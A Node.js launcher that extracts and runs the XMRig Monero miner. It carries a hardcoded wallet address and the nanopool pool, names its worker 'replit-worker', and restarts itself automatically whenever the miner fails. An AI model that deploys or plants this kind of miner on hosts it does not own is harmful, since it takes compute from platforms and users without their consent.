const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const tar = require('tar');

const minerFolder = path.join('xmrig-6.21.0-linux-x64', 'xmrig-6.21.0');
const minerBinary = path.join(minerFolder, 'xmrig');
const minerTar = 'xmrig-6.21.0-linux-x64.tar.gz';

async function checkXmrig() {
  if (fs.existsSync(minerBinary)) {
    console.log('[*] XMRig binary found. Skipping extraction.');
    return;
  }

  console.log('[*] XMRig not found. Checking for tar.gz file...');

  if (fs.existsSync(minerTar)) {
    console.log('[*] tar.gz file found. Extracting XMRig...');
    await extractXmrig();
    return;
  }

  console.log('[!] XMRig tar.gz file not found. Please ensure it is in the main directory.');
  process.exit(1);
}

async function extractXmrig() {
  try {
    await tar.x({ file: minerTar });
    fs.chmodSync(minerBinary, 0o755);  // Set executable permissions
    console.log('[*] XMRig extracted and ready.');
  } catch (err) {
    console.error('[!] Failed to extract the archive:', err.message);
    process.exit(1);
  }
}

async function startMining() {
  console.log('[*] Starting XMRig...');

  const pool = 'xmr-eu1.nanopool.org:14444';
  const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
  const workerName = 'replit-worker';
  const email = 'your@email.com';

  const xmrig = spawn(minerBinary, [
    '-o', pool,
    '-u', `${wallet}.${workerName}/${email}`,
    '-p', 'x',
    '--coin', 'monero',
    '--donate-level', '1',
    '--cpu-priority', '5',
    '--max-cpu-usage', '75',
  ], { stdio: ['ignore', 'pipe', 'pipe'] });

  xmrig.stdout.on('data', (data) => {
    console.log(`xmrig output: ${data.toString()}`);
  });

  xmrig.stderr.on('data', (data) => {
    console.error(`xmrig error: ${data.toString()}`);
  });

  xmrig.on('close', (code, signal) => {
    if (code === 0) {
      console.log('[*] XMRig exited successfully.');
    } else {
      console.error(`[!] XMRig exited with code ${code} and signal ${signal}. Restarting in 5 seconds...`);
      // Retry in case of non-zero exit code
      setTimeout(() => startMining(), 5000);
    }
  });

  xmrig.on('error', (err) => {
    console.error(`[!] Failed to start XMRig: ${err.message}`);
    process.exit(1);
  });
}

(async () => {
  try {
    await checkXmrig();
    await startMining();
  } catch (err) {
    console.error('[!] Fatal Error:', err.message);
    process.exit(1);
  }
})();
